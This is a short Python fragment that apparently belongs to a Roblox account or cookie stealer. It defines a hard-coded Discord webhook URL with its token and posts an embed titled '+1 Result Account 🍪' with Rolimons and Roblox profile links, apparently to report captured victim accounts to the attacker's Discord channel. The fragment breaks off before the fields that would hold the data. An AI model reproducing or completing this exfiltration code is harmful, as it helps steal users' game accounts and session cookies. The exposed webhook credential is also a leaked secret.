...
webhookk = "https://discord.com/api/webhooks/1066868666806833183/E5-h_ksEzgjG_N36f_8HxFbOC0RxGqvkSriVswO634W_W9fPUXE-tuJgaBbWznt47uzi"
...
discord.post(
    username="RoBeam BOT - JustHarry#5308 🍪",
    avatar_url="https://cdn.discordapp.com/attachments/1067540517702864928/1067544942966222899/icon.png",
    embeds=[
        {
            "username": "RoBeam BOT - JustHarry#5308 🍪",
            "title": "+1 Result Account 🍪",
            "description" : f"[Discord](https://discord.gg/kGx3HG69vb) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
            "color" : 12452044,
            "fields": [
